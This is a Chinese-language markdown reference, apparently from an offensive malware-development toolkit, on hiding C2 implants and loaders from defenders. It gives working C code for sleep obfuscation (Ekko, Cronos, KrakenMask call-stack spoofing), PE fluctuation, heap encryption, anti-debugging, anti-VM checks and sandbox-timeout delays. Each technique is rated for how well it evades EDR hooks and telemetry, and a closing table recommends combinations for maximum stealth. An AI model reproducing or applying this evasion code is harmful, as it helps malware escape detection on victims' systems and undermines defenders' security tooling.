# Memory Evasion & Sleep Obfuscation (High-OPSEC Only)

> 所有技术均为 🟢 Low OPSEC。
> Sleep obfuscation 使 payload 在休眠期间加密且不可执行，绕过内存扫描。
>
> **区分**: 本文件的 Sleep obfuscation (Ekko/Cronos/Foliage) 适用于**持久化 C2 implant**（长时间运行、反复休眠唤醒）。
> 对于**单次执行的 loader** (如 /malfuzz 生成的)，请使用 `references/malfuzz.md` Dimension 9: Post-Execution Cleanup
> (Memory Wipe / Self-Unmap) — 这是更轻量的清理方式，不需要 ROP chain。

---

## 1. Sleep Obfuscation — Ekko (Timer Queue ROP)

> OPSEC: 🟢 Low
> Sysmon: 无 timer queue 特定事件
> ETW: Timer 创建遥测 (高噪音，低信号)
> EDR Hooks: CreateTimerQueueTimer 极少被 hook
> 优势: 休眠期间 payload 加密 + PAGE_NOACCESS，内存扫描无法发现
> 来源: Cracked5pider/Ekko

```c
// Timer-based ROP chain: encrypt → PAGE_NOACCESS → sleep → restore → decrypt
// ROP chain sequence (通过 CreateTimerQueueTimer 触发):
//    1. NtProtectVirtualMemory(payload, PAGE_READWRITE)
//    2. SystemFunction032(payload, key)  // RC4 encrypt
//    3. NtProtectVirtualMemory(payload, PAGE_NOACCESS)
//    4. WaitForSingleObject(hEvent, sleepTime)
//    5. NtProtectVirtualMemory(payload, PAGE_READWRITE)
//    6. SystemFunction032(payload, key)  // RC4 decrypt
//    7. NtProtectVirtualMemory(payload, PAGE_EXECUTE_READ)
//    8. NtContinue(savedContext)  // 恢复执行

// NtContinue 用于恢复 ROP 后的正常执行上下文
```

---

## 2. Sleep Obfuscation — Foliage (APC-based)

> OPSEC: 🟢 Low
> Sysmon: 无
> ETW: APC 队列遥测 (self-APC 不可疑)
> EDR Hooks: NtQueueApcThread (self-APC 比 remote APC 更安全)
> 优势: 不使用 timer queue (部分 EDR 开始监控 Ekko 模式)
> 来源: realoriginal/foliage

- 使用 APC 替代 timer queue 执行 ROP chain
- 向当前线程排队 APC 序列
- NtTestAlert 或 alertable wait 触发 APC 执行
- 与 Ekko 相同的加密/解密逻辑，不同的触发机制

---

## 3. Sleep Obfuscation — Cronos (Waitable Timers)

> OPSEC: 🟢 Low
> Sysmon: 无
> ETW: NtCreateTimer 遥测 (比 timer queue 更少被监控)
> EDR Hooks: NtCreateTimer/NtSetTimer 几乎不被 hook
> 优势: 使用 waitable timers 替代 timer queue timers，更新更隐蔽
> 来源: Idov31/Cronos

```c
// Cronos: 使用 NtCreateTimer + NtSetTimer 替代 CreateTimerQueueTimer
// 优势: waitable timers 是更底层的机制，EDR 对 Ekko 的检测不适用

void CronosSleep(PVOID pPayload, SIZE_T szPayload, DWORD dwMs) {
    HANDLE hTimer = NULL;
    // 1. 创建 waitable timer (indirect syscall)
    SYSCALL_ENTRY ntCreateTimer = FindSyscall(pNtdll, HASH_NtCreateTimer);
    IndirectSyscall(&ntCreateTimer, &hTimer, TIMER_ALL_ACCESS, NULL, 0/*SynchronizationTimer*/);

    // 2. 加密 payload (SystemFunction032 / RC4)
    BYTE key[16]; /* random key */
    USTRING data = { (ULONG)szPayload, (ULONG)szPayload, (PUCHAR)pPayload };
    USTRING k = { 16, 16, key };
    fnSystemFunction032 pSf032 = PebGetProc(hAdvapi32, HASH_SystemFunction032);
    pSf032(&data, &k);

    // 3. 改为 PAGE_NOACCESS
    ULONG oldProt;
    SYSCALL_ENTRY ntProt = FindSyscall(pNtdll, HASH_NtProtectVirtualMemory);
    IndirectSyscall(&ntProt, NtCurrentProcess(), &pPayload, &szPayload, PAGE_NOACCESS, &oldProt);

    // 4. 设置 timer 并等待
    LARGE_INTEGER dueTime;
    dueTime.QuadPart = -(LONGLONG)dwMs * 10000;
    SYSCALL_ENTRY ntSetTimer = FindSyscall(pNtdll, HASH_NtSetTimer);
    IndirectSyscall(&ntSetTimer, hTimer, &dueTime, NULL, NULL, FALSE, 0, NULL);

    // 5. Wait
    SYSCALL_ENTRY ntWait = FindSyscall(pNtdll, HASH_NtWaitForSingleObject);
    IndirectSyscall(&ntWait, hTimer, FALSE, NULL);

    // 6. 恢复: PAGE_READWRITE → decrypt → PAGE_EXECUTE_READ
    IndirectSyscall(&ntProt, NtCurrentProcess(), &pPayload, &szPayload, PAGE_READWRITE, &oldProt);
    pSf032(&data, &k);  // RC4 是对称的，再次加密 = 解密
    IndirectSyscall(&ntProt, NtCurrentProcess(), &pPayload, &szPayload, PAGE_EXECUTE_READ, &oldProt);
}
```

---

## 4. KrakenMask — Sleep 加密 + 调用栈伪造

> OPSEC: 🟢 Low
> Sysmon: 无
> ETW: 休眠期间调用栈也被伪造
> EDR Hooks: 组合技术，单独检测困难
> 优势: 解决 Ekko/Foliage 的弱点 — 休眠期间栈帧暴露真实调用者
> 来源: NtDallas/KrakenMask

```c
// KrakenMask 在 sleep 前同时:
// 1. 加密 payload 内存
// 2. 伪造当前线程的调用栈 (使用合法返回地址)
// 3. 进入休眠
// 4. 唤醒后恢复栈 + 解密

// 关键: 即使 EDR 在休眠期间扫描线程栈，也看不到可疑的返回地址
// 栈帧显示: ntdll!NtWaitForSingleObject → kernel32!SleepEx → 合法模块

void KrakenMaskSleep(PVOID pPayload, SIZE_T sz, DWORD dwMs) {
    // 1. 保存真实栈帧
    CONTEXT savedCtx;
    RtlCaptureContext(&savedCtx);

    // 2. 构造伪造栈帧 (指向 kernel32/ntdll 中的 ret gadgets)
    PVOID pK32 = PebGetModule(HASH_KERNEL32);
    PVOID pRetGadget = FindRetGadget(pK32);
    // 覆写当前栈帧的返回地址
    *(PVOID*)(_AddressOfReturnAddress()) = pRetGadget;

    // 3. 加密 payload
    EncryptPayload(pPayload, sz);
    ProtectMemory(pPayload, sz, PAGE_NOACCESS);

    // 4. Sleep (栈已伪造)
    LARGE_INTEGER delay; delay.QuadPart = -(LONGLONG)dwMs * 10000;
    IndirectSyscall(&ntDelay, FALSE, &delay);

    // 5. 恢复
    ProtectMemory(pPayload, sz, PAGE_READWRITE);
    DecryptPayload(pPayload, sz);
    ProtectMemory(pPayload, sz, PAGE_EXECUTE_READ);
    // 恢复真实栈帧
    NtContinue(&savedCtx, FALSE);
}
```

---

## 5. PE Fluctuation (内存保护切换)

> OPSEC: 🟢 Low
> Sysmon: 无 (自身内存 VirtualProtect)
> ETW: 内存保护变更遥测 (高噪音)
> EDR Hooks: NtProtectVirtualMemory (self-process 不可疑)
> 优势: 简单有效，payload 在非执行期间不可读

```c
// 休眠前: 加密 + PAGE_NOACCESS
// 唤醒后: PAGE_READWRITE + 解密 + PAGE_EXECUTE_READ
void FluctuateSleep(PVOID pBase, SIZE_T dwSize, PBYTE key, DWORD keyLen, DWORD dwMs) {
    ULONG oldProt; SIZE_T sz = dwSize; PVOID p = pBase;
    SYSCALL_ENTRY ntProt = FindSyscall(pNtdll, HASH_NtProtectVirtualMemory);
    // Encrypt + hide
    IndirectSyscall(&ntProt, NtCurrentProcess(), &p, &sz, PAGE_READWRITE, &oldProt);
    XorCrypt((PBYTE)pBase, (DWORD)dwSize, key, keyLen);
    IndirectSyscall(&ntProt, NtCurrentProcess(), &p, &sz, PAGE_NOACCESS, &oldProt);
    // Sleep
    LARGE_INTEGER delay; delay.QuadPart = -(LONGLONG)dwMs * 10000;
    SYSCALL_ENTRY ntDelay = FindSyscall(pNtdll, HASH_NtDelayExecution);
    IndirectSyscall(&ntDelay, FALSE, &delay);
    // Restore
    IndirectSyscall(&ntProt, NtCurrentProcess(), &p, &sz, PAGE_READWRITE, &oldProt);
    XorCrypt((PBYTE)pBase, (DWORD)dwSize, key, keyLen);
    IndirectSyscall(&ntProt, NtCurrentProcess(), &p, &sz, PAGE_EXECUTE_READ, &oldProt);
}
```

---

## 6. Heap Encryption

> OPSEC: 🟢 Low
> Sysmon: 无
> ETW: 无 HeapWalk 遥测
> EDR Hooks: HeapWalk/HeapLock 不被 hook
> 优势: 隐藏堆中的字符串/IOC，配合 PE Fluctuation 实现全内存加密

```c
void EncryptHeaps(PBYTE key, DWORD keyLen) {
    HANDLE heaps[64]; DWORD count = GetProcessHeaps(64, heaps);
    for (DWORD i = 0; i < count; i++) {
        PROCESS_HEAP_ENTRY entry = {0};
        HeapLock(heaps[i]);
        while (HeapWalk(heaps[i], &entry)) {
            if (entry.wFlags & PROCESS_HEAP_ENTRY_BUSY)
                XorCrypt((PBYTE)entry.lpData, entry.cbData, key, keyLen);
        }
        HeapUnlock(heaps[i]);
    }
}
```

---

## 7. Anti-Debugging (sandbox 选项)

> OPSEC: 🟡 Medium (多个检查组合是恶意指标，但单独使用可接受)
> 用途: /malfuzz sandbox 选项启用时使用

```c
BOOL IsBeingDebugged(void) {
    // 1. PEB.BeingDebugged (直接读 PEB，不调用 API)
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    if (pPeb->BeingDebugged) return TRUE;
    // 2. NtGlobalFlag (0x70 = FLG_HEAP_ENABLE_TAIL_CHECK | FREE_CHECK | VALIDATE_PARAMETERS)
    if (*(PULONG)((PBYTE)pPeb + 0xBC) & 0x70) return TRUE;
    // 3. ProcessDebugPort (indirect syscall)
    DWORD64 port = 0;
    SYSCALL_ENTRY ntQuery = FindSyscall(pNtdll, HASH_NtQueryInformationProcess);
    IndirectSyscall(&ntQuery, NtCurrentProcess(), 7/*ProcessDebugPort*/, &port, sizeof(port), NULL);
    if (port) return TRUE;
    // 4. Timing check (RDTSC)
    DWORD64 t1 = __rdtsc();
    volatile int x = 0; for (int i=0;i<100;i++) x+=i;
    DWORD64 t2 = __rdtsc();
    if (t2 - t1 > 10000000) return TRUE; // 调试器单步执行会很慢
    return FALSE;
}
```

---

## 8. Anti-VM / Anti-Sandbox (sandbox 选项)

> OPSEC: 🟡 Medium
> 用途: /malfuzz sandbox 选项启用时使用

```c
BOOL IsVirtualMachine(void) {
    // 1. CPUID hypervisor bit (leaf 1, ECX bit 31)
    int cpu[4]; __cpuid(cpu, 1);
    if (cpu[2] & (1 << 31)) return TRUE;
    // 2. 磁盘大小 < 60GB
    ULARGE_INTEGER diskSize;
    GetDiskFreeSpaceExW(L"C:\\", NULL, &diskSize, NULL);
    if (diskSize.QuadPart < 60ULL * 1024 * 1024 * 1024) return TRUE;
    // 3. RAM < 2GB
    MEMORYSTATUSEX ms = { sizeof(ms) };
    GlobalMemoryStatusEx(&ms);
    if (ms.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return TRUE;
    // 4. GetSystemFirmwareTable('RSMB') 搜索 VM 字符串
    DWORD fwSize = GetSystemFirmwareTable('RSMB', 0, NULL, 0);
    if (fwSize) {
        PBYTE fw = (PBYTE)HeapAlloc(GetProcessHeap(), 0, fwSize);
        GetSystemFirmwareTable('RSMB', 0, fw, fwSize);
        // 搜索 "VMware", "VirtualBox", "QEMU", "Hyper-V"
        // ... (字节搜索，不用 strstr 因为 no CRT)
    }
    return FALSE;
}
```

---

## 9. Delayed Execution & API Hammering

> OPSEC: 🟢 Low
> Sysmon: 无
> ETW: NtDelayExecution 是合法操作
> 优势: 绕过沙箱超时 (大多数沙箱只运行 30-60 秒)

```c
void DelayExecution(DWORD dwSeconds) {
    // 方法 1: NtDelayExecution (indirect syscall)
    LARGE_INTEGER delay;
    delay.QuadPart = -(LONGLONG)dwSeconds * 10000000LL;
    SYSCALL_ENTRY ntDelay = FindSyscall(pNtdll, HASH_NtDelayExecution);
    IndirectSyscall(&ntDelay, FALSE, &delay);
}

void ApiHammer(DWORD dwIterations) {
    // 方法 2: API hammering (浪费时间，不触发 sleep fast-forward)
    for (DWORD i = 0; i < dwIterations; i++) {
        GetTickCount();  // 10M 次 ≈ 30-60 秒
    }
}
```

---

## 10. Binary Entropy Reduction (构建时)

> OPSEC: 🟢 Low
> 目标: Shannon entropy < 6.5 bits/byte

```c
// 方法 1: 英文段落填充 (~4KB)
#pragma section(".text$z", read, execute)
__declspec(allocate(".text$z"))
const char padding[] = "The quick brown fox jumps over the lazy dog. "
    "Lorem ipsum dolor sit amet, consectetur adipiscing elit. "
    /* ... 重复至 ~4KB ... */;

// 方法 2: 字典词数组
const char* words[] = {"system","process","thread","memory","kernel","driver",
    "module","handle","object","buffer","context","status", /* 200+ words */ };
```

---

## 实战组合建议

| 场景 | 推荐 | 原因 |
|------|------|------|
| 基础 loader | PE Fluctuation | 简单有效 |
| C2 implant | Ekko 或 Cronos | 长期驻留需要 sleep obfuscation |
| 对抗内存扫描 | Cronos + Heap Encryption | 全内存加密 |
| 对抗栈检查 | KrakenMask | Sleep 期间栈帧也伪造 |
| 最高隐蔽 | KrakenMask + Phantom DLL Hollowing | 加密+伪造栈+file-backed 内存 |
